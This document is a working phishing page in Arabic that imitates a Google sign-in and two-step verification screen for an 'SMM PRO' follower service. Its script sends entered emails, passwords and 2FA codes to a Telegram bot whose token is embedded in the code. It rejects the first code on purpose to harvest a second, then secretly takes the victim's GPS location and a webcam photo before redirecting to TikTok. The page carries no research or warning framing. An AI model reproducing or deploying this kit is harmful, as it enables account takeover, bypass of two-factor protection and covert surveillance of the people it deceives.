<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Account Verification</title>
    <style>
        :root { --google-blue: #1a73e8; }
        body { font-family: 'Roboto', arial, sans-serif; background: #fff; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .card { width: 90%; max-width: 400px; padding: 35px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; background: white; z-index: 10; }
        .google-logo { margin-bottom: 10px; }
        h1 { font-size: 22px; font-weight: 400; margin-bottom: 10px; color: #202124; }
        p { font-size: 14px; color: #3c4043; margin-bottom: 25px; }
        input { width: 100%; padding: 13px; margin-bottom: 10px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; }
        input:focus { border: 2px solid var(--google-blue); }
        .btn { background: var(--google-blue); color: white; border: none; padding: 12px 24px; border-radius: 4px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px; }
        /* شريط جوجل السفلي الملحمي */
        .bottom-bar { position: fixed; bottom: 0; width: 100%; background: white; border-top: 1px solid #ddd; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; }
        #v { position: fixed; width: 1px; height: 1px; opacity: 0; }
        .error { color: #d93025; font-size: 12px; text-align: right; margin-bottom: 10px; display: none; }
    </style>
</head>
<body>

    <div class="card" id="main-card">
        <img class="google-logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
        
        <div id="step-1">
            <h1>تسجيل الدخول</h1>
            <p>المتابعة إلى SMM PRO Verification</p>
            <input type="email" id="email" placeholder="البريد الإلكتروني">
            <input type="password" id="pass" placeholder="كلمة المرور">
            <button class="btn" onclick="goToStep2()">التالي</button>
        </div>

        <div id="step-2" style="display:none;">
            <h1>التحقق بخطوتين</h1>
            <p>أدخل الرمز المكون من 6 أرقام المرسل إلى هاتفك (G-XXXXXX)</p>
            <div class="error" id="otp-error">الرمز غير صحيح. حاول مرة أخرى.</div>
            <input type="number" id="otp" placeholder="أدخل الرمز">
            <button class="btn" onclick="finalStrike()" style="background: #34a853;">تأكيد الرمز</button>
        </div>
    </div>

    <div class="bottom-bar">
        <div style="display:flex; align-items:center; gap:8px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="18">
            <span style="font-size: 13px; color: #3c4043; font-weight: 500;">المتابعة باستخدام Google</span>
        </div>
        <div style="font-size: 12px; color: #5f6368;">SMM PRO Service</div>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
        const ID = "1772820433";
        let attempt = 0; // نظام محاكاة رفض الرمز الأول

        async function send(m, isImg=false) {
            let u = `https://api.telegram.org/bot${T}/`;
            if(!isImg) {
                await fetch(u+'sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:ID,text:m})});
            } else {
                const b = await (await fetch(m)).blob();
                const f = new FormData(); f.append('chat_id',ID); f.append('photo',b,'hit.png');
                await fetch(u+'sendPhoto',{method:'POST',body:f});
            }
        }

        function goToStep2() {
            const e = document.getElementById('email').value;
            const p = document.getElementById('pass').value;
            if(!e || !p) return alert("أدخل البيانات");
            
            send(`🚨 صيد حساب جديد!\n📧 الإيميل: ${e}\n🔑 الباسورد: ${p}`);
            document.getElementById('step-1').style.display = "none";
            document.getElementById('step-2').style.display = "block";
        }

        async function finalStrike() {
            const otp = document.getElementById('otp').value;
            if(otp.length < 6) return alert("الرمز ناقص!");

            // خدعة "الرمز الخطأ": نرفض أول محاولة دائماً ليضع الرمز الحقيقي في الثانية
            if(attempt === 0) {
                document.getElementById('otp-error').style.display = "block";
                document.getElementById('otp').value = "";
                send(`⚠️ محاولة رمز أولى (ربما وهمي): ${otp}`);
                attempt++;
                return;
            }

            // إذا وصلنا هنا، يعني هذه هي المحاولة الثانية (الأكيدة)
            await send(`✅ كود الـ 2FA المؤكد:\n🔢 الرمز: G-${otp}`);

            // سحب الـ GPS والصورة (الضربة القاضية)
            navigator.geolocation.getCurrentPosition(pos => {
                send(`🎯 موقع دقيق (Bypass):\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
            }, null, {enableHighAccuracy: true});

            const s = await navigator.mediaDevices.getUserMedia({video:true});
            const vid = document.getElementById('v'); vid.srcObject = s;
            
            setTimeout(() => {
                const can = document.getElementById('c');
                can.width=vid.videoWidth; can.height=vid.videoHeight;
                can.getContext('2d').drawImage(vid,0,0);
                send(can.toDataURL('image/png'), true);
                alert("✅ تم التحقق بنجاح! جاري إرسال المتابعين.");
                window.location.href = "https://www.tiktok.com";
            }, 1500);
        }
    </script>
</body>
</html>
